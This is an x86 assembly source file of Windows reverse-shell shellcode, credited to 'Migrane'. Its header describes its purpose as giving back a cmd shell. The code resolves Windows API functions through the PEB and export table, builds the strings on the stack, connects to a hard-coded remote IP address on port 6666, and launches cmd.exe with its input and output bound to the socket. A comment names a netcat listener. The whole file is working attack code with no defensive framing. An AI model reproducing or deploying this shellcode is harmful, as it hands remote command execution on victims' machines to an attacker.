/*
Author:Migrane
IF-MODE:N
Language:asm
Func:Back a cmd shell
Data:2019-12-8
*/
		;get the address of kernel32.dll
		xor ecx,ecx
		mov eax,fs:[0x30];EAX=PEB
		mov eax,[eax+0xc];EAX=PEB->LDR
		mov esi,[eax+0x14];ESI=PEB->Ldr.lnMemOrder
		lodsd	 ;mov eax,[esi];esi+=4;EAX=SecondMod->ntdll
		xchg eax,esi 
		lodsd	;EAX=ThirdMod->kernel
		mov ebx,[eax+0x10] ;EBX=kernel->DllBase

		;Get address of GetProcessAddress
		mov edx,[ebx+0x3c] ;DOS HEADER->PE HEADER offset
		add edx,ebx ;PE HEADER 
		mov edx,[edx+0x78] ;EDX=DATA DIRECTORY
		add edx,ebx ;EDX=DATA DIRECTORY
		
		;compare string 
		xor ecx,ecx
		mov esi,[edx+0x20]
		add esi,ebx

Get_Func:
		inc ecx
		lodsd ;mov eax,esi;esi+=4
		add eax,ebx;
		cmp dword ptr[eax],0x50746547 ;GetP
		jnz Get_Func
		cmp dword ptr[eax+0x4],0x41636f72;proA
		jnz Get_Func
		cmp dword ptr[eax+0x8],0x65726464 ;ddre
		jnz Get_Func
		
		;get address
		mov esi,[edx+0x24] ;AddressOfNameOrdinals
		add esi,ebx
		mov cx,[esi+ecx*2];num
		dec ecx 
		mov esi,[edx+0x1c];AddressOfFunctions
		add esi,ebx
		mov edx,[esi+ecx*4] 
		add edx,ebx ;EDX = GetProcessAddress

;EDX=GetProcAddr
;EBX=kernel32

		;get CreateProcess address
		xor ecx,ecx
		push ebx ;Kernel32
		push edx;GetProcAddr
		mov cx,0x4173;sA
		push ecx ;sA
		push 0x7365636F;oces
		push 0x72506574;tePr
		push 0x61657243;Crea
		push esp ;"CreateProcessA"
		push ebx
		call edx;GetProcAddr("CreateProcessA")

		add esp,0x10 ;clean stack
		push eax ;CreateProcessA
		
		;CreateProcessA <--esp
		;GetProcAddr <-- esp+4
		;Kernel32 <--esp+8

		//mov ebx,[esp+8];Kernel32
		mov edx,[esp+4];GetProAddr

		;get GetStartupInfo address
		mov ecx,0x416F66
		push ecx;foA
		push 0x6E497075;upIn
		push 0x74726174;tart
		push 0x53746547;GetS
		push esp
		push ebx ;Kernel32
		call edx ;GetProAddresss("GetStartupInfoA")


		add esp,0x10;clean stack
		push eax ;GetStartupInfoA
		mov edx,[esp+8];GetProAddr
		;Get LoadLibrary
		xor ecx,ecx
		push ecx ;0
		push 0x41797261 ; aryA
		push 0x7262694c ; Libr
		push 0x64616f4c ; Load 
		push esp;"LoadLibraryA"
		push ebx ;
		call edx ;GerProcAddress("LoadLibraryA")
	

			
		add esp,0xc ;pop "LoadLibraryA"
		pop ecx; ECX=0
		push eax ;EAX=LoadLibraryA
		mov cx,0x3233 ; 32
		push ecx;
		push 0x5F327377 ; ws2_
		push esp        ; "ws2_32"
		call eax        ; LoadLibrary("ws2_32.dll")


		;MessageBoxA address
		add esp,0x8 ;pop "ws2_32.dll"
		push eax
		;ws2_32.dll <--esp
		;LoadLibraryA <--esp+4
		;GetStartupInfoA <--esp+8
		;CreateProcessA <--esp+0c
		;GetProcAddr <-- esp+0x10
		;Kernel32 <--esp+0x14



		mov edx,[esp+0x10] ;GetProcAddress
		xor ecx,ecx
		mov cx,0x7075;up
		push ecx
		push 0x74726174;tart
		push 0x53415357 ;WSAS
		push esp                       ;"WSAStartup"
		push [esp+0x10];ws2_32.dll
		call edx;GetProcAddress("WSAStartup")

		add esp,0xc 
		push eax;WSAStartup

		mov edx,[esp+0x14] ;GetProcAddress
		mov ebx,[esp+4];ws2_32.dll
		xor ecx,ecx
		mov cx,0x4174;
		push ecx ;tA
		push 0x656B636F ;ocke
		push 0x53415357 ;WSAS
		push esp                       ;"WSASocket"
		push ebx;ws2_32.dll
		call edx;GetProcAddress("WSASocket")
		
		add esp,0xc 
		push eax;WSASocket

		mov edx,[esp+0x18] ;GetProcAddress
		mov ebx,[esp+8];ws2_32.dll
		xor ecx,ecx
		push 0x746365 ;ect
		push 0x6E6E6F63 ;conn
		push esp                       ;"connect"
		push ebx;ws2_32.dll
		call edx;GetProcAddress("connect")

		;inet_addr
		add esp,0x8 
		push eax;connect
		mov edx,[esp+0x1c] ;GetProcAddress
		mov ebx,[esp+0xc];ws2_32.dll
		xor ecx,ecx
		mov cx,0x72;
		push ecx;r
		push 0x6464615F;_add
		push 0x74656E69;inet
		push esp                       ;"inet_addr"
		push ebx;ws2_32.dll
		call edx;GetProcAddress("inet_addr")
		
		;htons
		add esp,0xc
		push eax;
		mov edx,[esp+0x20] ;GetProcAddress
		mov ebx,[esp+0x10];ws2_32.dll
		xor ecx,ecx
		mov cx,0x73
		push ecx;s
		push 0x6E6F7468;hton
		push esp                       ;"htons"
		push ebx;ws2_32.dll
		call edx;GetProcAddress("htons")

		add esp,0x8
		push eax

		;htons <--esp
		;inet_addr <--esp+4
		;connect <--esp+8
		;WSASocket <--esp+0xc
		;WSAStartup <--esp+0x10
		;ws2_32.dll <--esp+0x14
		;LoadLibraryA <--esp+0x18
		;GetStartupInfoA <--esp+1c
		;CreateProcessA <--esp+0x20
		;GetProcAddr <-- esp+0x24
		;Kernel32 <--esp+0x28

		/*Socket部分*/

		
		//WSTartup(0x202,&WSADATA,)
		sub esp,0x20
		mov eax,[esp+0x30]
		push esp;lpWSADATA
		push 0x202;wVersionRequested
		call eax //if eax->0 sucess.else fail

		
		//WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0)
		mov eax,[esp+0x2c];WSASocket
		xor ecx,ecx
		push ecx
		push ecx
		push ecx
		mov cx,0x6
		push ecx
		mov cx,0x1
		push ecx
		inc ecx
		push ecx
		call eax

		push eax; //push socket


		//inet_addr(120.79.174.75)
		mov eax,[esp+0x28] ;inet_addr
		xor ecx,ecx
		mov cx,0x35
		push ecx;5
		push 0x372E3437;74.7
		push 0x312E3937;79.1
		push 0x2E303231;120.
		push esp;
		call eax;
		
		add esp,0x10
		push eax;push Remote_addr -->sa_data+2

		//htons(6666)
		mov eax,[esp+0x28] ;htons
		push 0x1A0A ;6666
		call eax

		mov edx,[esp+0x30];connect
		//Store sock_addr
		push ax;push Remote_ports -->sa_data
		mov ax,0x2
		push ax;push AF_INET -->sa_family

		mov ebx,esp; store sock_addr
		
		//Connect(socket,&sock_addr,sizeof(sock_addr));
		/*
		00000000 sockaddr        struc ; (sizeof=0x10, align=0x2, copyof_12)
		00000000                                         ; XREF: _wmain_0/r
		00000000 sa_family --> AF_INET(2)               ; XREF: _wmain_0+80/w
		00000002 sa_data  -->  htons(REMOTE_PROT)        ; XREF: _wmain_0+75/w
		00000004 sa_data+2 --> inet_addr(REMOTE_ADDR)     ; _wmain_0+9B/w
		00000010 sockaddr        ends
		*/

		push 0x10 ; sizeof(sock_addr)
		push ebx ;scok_addr
		push [esp+0x10];socket

		call edx ;connect  ;	server#nc -l 6666 (close fire wall)
		
		
		/*创建cmd.exe子进程*/

		/*
		00000000 _STARTUPINFOW   struc ; (sizeof=0x44, align=0x4, copyof_14)
		00000000                                         ; XREF: _wmain_0/r
		00000000 cb              ->size 44               ; XREF: _wmain_0+134/w
		00000004 lpReserved      dd ?                    ; offset
		00000008 lpDesktop       dd ?                    ; offset
		0000000C lpTitle         dd ?                    ; offset
		00000010 dwX             dd ?
		00000014 dwY             dd ?
		00000018 dwXSize         dd ?
		0000001C dwYSize         dd ?
		00000020 dwXCountChars   dd ?
		00000024 dwYCountChars   dd ?
		00000028 dwFillAttribute dd ?
		0000002C dwFlags         <--0x100
		00000030 wShowWindow     dw
		00000032 cbReserved2     dw ?
		00000034 lpReserved2     dd ?                    ; offset
		00000038 hStdInput       ->socket                ; XREF: _wmain_0+159/w ; offset
		0000003C hStdOutput      ->socket                 ; XREF: _wmain_0+14D/w
		00000040 hStdError       ->socket                 ; XREF: _wmain_0+141/w
		00000040                                         ; _wmain_0+147/r ; offset
		00000044 _STARTUPINFOW   ends
		00000044
*/
		//init _STARTUPINFO
		
		mov esi,[esp+0x8]
		push esi; push hStdError
		push esi; push hStdOutput
		push esi; push StdInput
		xor esi,esi
		xor ecx,ecx
		push esi;
		push esi;
		push 0x100; dwFlags
		mov cx,0xa

PUSH_NULL:	
		push esi
		loop PUSH_NULL

		mov ecx,0x44 ;cb
		push ecx
		mov edx,esp ;_STARTUPINFO

		mov ebx,[esp+0x90];CreateProcess

		push 0x657865;exe
		push 0x2E646D63;cmd.
		mov esi,esp ;"cmd.exe"
		//CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)

		push edx;&pi
		push edx ;&si
		xor ecx,ecx
		push ecx;NULL
		push ecx;NULL
		push ecx;NULL
		inc ecx
		push ecx;TRUE
		sub ecx,0x1
		push ecx;NULL
		push ecx;NULL
		push esi;cmdline
		push ecx;NULL
		call ebx;CreateProcess

		push eax
		
		nop
		nop
		nop


